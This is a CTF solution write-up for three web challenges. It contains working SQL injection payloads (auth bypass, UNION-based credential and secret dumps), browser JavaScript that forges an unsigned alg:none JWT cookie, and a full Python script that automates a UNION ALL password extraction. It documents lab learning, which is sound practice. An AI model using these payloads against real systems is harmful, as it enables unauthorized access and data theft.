# WEB EXPLOITATION

# 1. Database Incursion 2.0
>DESCRIPTION
Directly access the challenge server at https://database-incursion-v2.nitephase.live/

## Solution:

1. First, I access the website through the link given in the question.
2. From the name of the challenge, I had a doubt that this challenge has something to do with database, which means SQLI.
3. When I accessed the website and saw it was a login page, I somewhat took the path of SQLi to solve the above challenge, initially.
4. So, after some trial and error in injecting some sql injections , this sqli worked - ' OR '1'='1 . So, I got pass the first login window.
5. Following this we are presented with a screen where we can see details of various employees and search via name and the page also includes a field for entering admin password.
<img width="1911" height="770" alt="1 1" src="https://github.com/user-attachments/assets/e33a243b-6919-4e2d-8ff7-93dcad704008" />

6. But there was a clue that "someone from the management has the passcode". 
7. Inorder to sort the management employees accordingly, I passed the sqli - `' or department='Management'--`
8. This reveals another clue stating that an employee named 'Kiwi' has the password.
<img width="1913" height="872" alt="1 2" src="https://github.com/user-attachments/assets/7af5471d-b12b-4ee1-a814-8b349cd55fe2" />

9. By searching or querying, for 'Kiwi' we find 4 employees named Kiwi, whom is in management, I pass the sqli - `'or (department='Management' and name='Kiwi')--`
<img width="1916" height="876" alt="1 3" src="https://github.com/user-attachments/assets/5615fc37-7f07-4542-96bc-0807d46dc31d" />

10. This gives us the passcode for the next level.
11. We are directed to a admin panel, where we can run a report query and section named reports with columns and a metadata registry.
12. We know that this is an SQLi challenge. So, my plan was to mainly input SQLi payloads into the search area and get the secret stored in the metadata.
13. Before I got the right SQLi, I did multiple trial and errors and tried to make my way up.
a) simple auth bypasses - ' OR '1'='1' --
b) To Find number of columns - UNION SELECT NULL,NULL,NULL,NULL -- 
c) To Dump users (username:password) - ' UNION SELECT group_concat(username || ':' || password),NULL,NULL,NULL FROM users -- 
    which gave the output as kwA9gKGmXKYFi1MbB2WGwcNdwTstr7XM:PcnqmffOwMyV9D14N8HXzvAxlV6VuYZ9
14. Finally I passed the injection - `' UNION SELECT group_concat(secrets),NULL,NULL,NULL FROM CITADEL_ARCHIVE_2077 -- `, which Dump everything in the secrets column, by concatenating everything in that column, which revealed the flag!!
<img width="1901" height="851" alt="1 4" src="https://github.com/user-attachments/assets/410e8e0f-07b0-428c-84ba-99262aa2f6d9" />


## Flag:
```
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}
```

## Concepts Learnt:
- Learnt a lot in the concepts of SQLi.
- UNION NULL,NULL.......... - UNION queries only work when column count matches, so you must know the exact number before extracting data.
- group_concat(column) - merges many rows into one string. It is super useful when the site shows only one row, letting you view all values at once (like the flag).

## References:
- https://portswigger.net/web-security/sql-injection - I used this to learn some of the SQLi concepts.

***


# 2. Temporal Token
>DESCRIPTION
I made my own website with custom auth, but why can't i login with my credentials?

```
Username: Belegar
Password: Ironhammer
```

Directly access the challenge server at https://temporal-token.nitephase.live

## Solution:

1. First, on accessing the website through the link provided, I could see a login portal, where we could enter the username and password.
2. Bcz I didn't get any immediate ideas on what to do, I started looking for clues.
3. I had some guesses on what this site is gonna do, as it is a login portal, it could be a client-side token or cookie to gate access OR The challenge name Temporal Token points at time-based / timestamped tokens or tamperable session tokens.
4. I deviated into multiple other ways like:
a) Looking into the storages in the application section of the site 
b) Referring to cookies and stuff 
5. Then, I got another clue like what does this response section of the website mean?? AND it is referring to some sort of error as well.
6. After a bit of digging, I understood that the server is looking for a cookie named token containing a bearer token and Itâ€™s rejecting us because that cookie is missing.
7. So, I understood this is some kind of JWT.
8. In order to pull of this, I decided to write a Java Script into the console of the site. The js :
```js
// create a simple alg:none JWT and set it as cookie named "token"
function b64url(s){ return btoa(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,''); }
const header = b64url(JSON.stringify({alg:"none",typ:"JWT"}));
const payload = b64url(JSON.stringify({username:"Belegar", exp: 9999999999}));
const token = header + "." + payload + "."; // try with and without trailing dot if needed
document.cookie = "token=" + token + "; path=/";
location.reload();
```
<img width="1897" height="826" alt="2 2" src="https://github.com/user-attachments/assets/f4e8d391-ba2b-44bb-8b71-f8b380d25b87" />

9. On executing this, it revealed the flag.
<img width="657" height="441" alt="2 1" src="https://github.com/user-attachments/assets/3e22eccd-409d-42b0-bcb4-545db4b25662" />


## Flag:
```
nite{50_y0u_kn0w_h0w_jw75_w0rk_n0w?}
```

## Concepts Learnt:
- I was able to learn some of the concepts from the topic of JWT.
- Servers must always verify JWT signatures and never trust client-provided alg or payload. alg: none must always be rejected; signature verification must be enforced server-side.

## References:
https://www.jwt.io/ - I used this JWT decoder to construct the logic behind the JS and manually verifying it.

***

# 3. Oneshot
>DESCRIPTION
Directly access the challenge server at https://pacman-git-master-mrrobot404s-projects.vercel.app

## Solution:
1. On opening the challenge, I accessed the website and downloaded the python code.
2. On analyzing the code, I understood that this challenge has something to do with SQLi. But we got only "oneshot" to get this right.
3. What I was able to understand was that we nneded to use SQLi to dump the random password (needed to get the flag).
4. Inorder to carry that out, I created a python code that does the above requirements and connects that to the website server to get the corresponding output for the input.
5. On many trial and error attempts that I did some of the outputs that I got is :
<img width="998" height="227" alt="3 0" src="https://github.com/user-attachments/assets/040e5ba3-b552-4568-9bfe-c21fee996da0" />

6. The correct version of the code to do this is, as shown below. And this revealed the FLAG !!!

CODE USED TO SOLVE:
```py
cat > get_flag.py <<'PY'
#!/usr/bin/env python3
# Final attempt: use UNION ALL and start with %' AND 1=0 so the original row is suppressed
# This tries to return 32 single-char rows (UNION ALL preserves duplicates).
import requests, re, html, sys

URL = "https://pacman-git-master-mrrobot404s-projects.vercel.app"

# 1) create new session
r = requests.post(URL + "/new_session")
m = re.search(r'value="([0-9a-f]{16})"', r.text)
if not m:
    print("Couldn't find session id. /new_session HTML:")
    print(r.text[:2000])
    sys.exit(1)
sid = m.group(1)
print("[*] session id:", sid)

# 2) payload: start with %' AND 1=0 to force original WHERE false,
# then UNION ALL substr(password,i,1) for i=1..32
parts = [f"UNION ALL SELECT substr(password,{i},1) FROM table_{sid}" for i in range(1,33)]
payload = "%' AND 1=0 " + " ".join(parts) + " -- "

# 3) send one-shot search
r2 = requests.post(URL + "/search", data={"id": sid, "query": payload})
if r2.status_code != 200:
    print("Search returned", r2.status_code)
    print(r2.text[:2000])
    sys.exit(1)

# 4) parse <li> results and keep only single-char rows
raw_items = re.findall(r"<li>(.*?)</li>", r2.text, flags=re.S)
items = [html.unescape(x).strip() for x in raw_items if x.strip()!='']
print("[*] Raw <li> entries:", items)
chars = [c for c in items if len(c) == 1]
print("[*] Single-char entries (count):", len(chars))
print("[*] Single-char entries:", chars)

if len(chars) != 32:
    print(f"[!] Warning: expected 32 chars but found {len(chars)}. Paste the Raw <li> entries here if it fails.")
password = "".join(chars)
print("[+] Recovered password:", password)

# 5) submit guess
r3 = requests.post(URL + "/guess", data={"id": sid, "password": password})
print("[+] /guess response:")
print(r3.text)
PY

python3 -m pip install --user requests >/dev/null 2>&1 || true
python3 get_flag.py
```
<img width="1723" height="222" alt="3 1" src="https://github.com/user-attachments/assets/b3608175-2d3e-441c-ad65-97d6f3ee4f63" />


## Flag:
```
nite{are_you_feeling_the_heat_now :)}
```
## Concepts Learnt:
- In this challenge I was able to learn some practical concepts on how to automate a required task, by using python code.
- In this challenge, we needed to extract <li> elements and filtered only the characters that mattered.This helps to automate flag extraction instead of manually copying 32 characters.

## References:
- https://realpython.com/python-requests/ - I used this to get some of my python code requirements.

***
